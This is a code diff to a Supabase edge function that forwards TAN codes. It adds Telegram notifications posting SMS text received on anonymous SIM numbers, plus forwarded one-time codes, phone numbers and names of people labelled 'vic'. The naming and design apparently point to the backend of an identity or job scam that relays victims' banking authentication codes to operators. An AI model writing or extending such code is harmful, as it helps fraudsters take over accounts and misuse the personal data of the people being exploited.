@@ -1,5 +1,27 @@
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 import { loadSevenIoSettings, processAssignmentForward } from "../_shared/forwardTan.ts";
+import { sendTelegramNotification } from "../_shared/telegram.ts";
+
+async function loadAssignmentContext(serviceClient: any, assignmentId: string) {
+  const { data: a } = await serviceClient
+    .from("verification_assignments")
+    .select("id, user_id, verification_id, phone_number_id")
+    .eq("id", assignmentId)
+    .maybeSingle();
+  if (!a) return null;
+  const [{ data: prof }, { data: ver }, { data: phone }] = await Promise.all([
+    serviceClient.from("profiles").select("first_name, last_name, email").eq("id", a.user_id).maybeSingle(),
+    serviceClient.from("verifications").select("title").eq("id", a.verification_id).maybeSingle(),
+    a.phone_number_id
+      ? serviceClient.from("phone_numbers").select("token").eq("id", a.phone_number_id).maybeSingle()
+      : Promise.resolve({ data: null }),
+  ]);
+  return {
+    vicName: `${prof?.first_name ?? ""} ${prof?.last_name ?? ""}`.trim() || prof?.email || "Unbekannt",
+    verificationTitle: ver?.title ?? "Auftrag",
+    phoneToken: phone?.token ?? null,
+  };
+}
 
 const corsHeaders = {
   "Access-Control-Allow-Origin": "*",
@@ -92,13 +114,15 @@ Deno.serve(async (req) => {
 
     const data = await apiRes.json();
 
-    // Inline TAN forwarding (fire-and-forget so the response isn't delayed).
+    // Inline TAN forwarding + Telegram notifications (fire-and-forget).
     if (assignmentId && typeof assignmentId === "string") {
       (async () => {
         try {
+          const ctxInfo = await loadAssignmentContext(serviceClient, assignmentId);
           const settings = await loadSevenIoSettings(serviceClient);
+          let result: Awaited<ReturnType<typeof processAssignmentForward>> | null = null;
           if (settings) {
-            await processAssignmentForward(
+            result = await processAssignmentForward(
               {
                 serviceClient,
                 sevenioApiKey: settings.apiKey,
@@ -106,6 +130,25 @@ Deno.serve(async (req) => {
               },
               assignmentId
             );
+          }
+
+          if (result && ctxInfo) {
+            for (const sms of result.newSms ?? []) {
+              await sendTelegramNotification(serviceClient, "anosim_sms_received", {
+                vic_name: ctxInfo.vicName,
+                verification_title: ctxInfo.verificationTitle,
+                sender: sms.sender,
+                text: sms.text,
+              });
+            }
+            for (const fw of result.forwardedCodes ?? []) {
+              await sendTelegramNotification(serviceClient, "tan_forwarded_to_vic", {
+                vic_name: ctxInfo.vicName,
+                verification_title: ctxInfo.verificationTitle,
+                vic_phone: fw.vicPhone,
+                code: fw.code,
+              });
+            }
           }
         } catch (e) {
           console.error("inline forward failed", e);
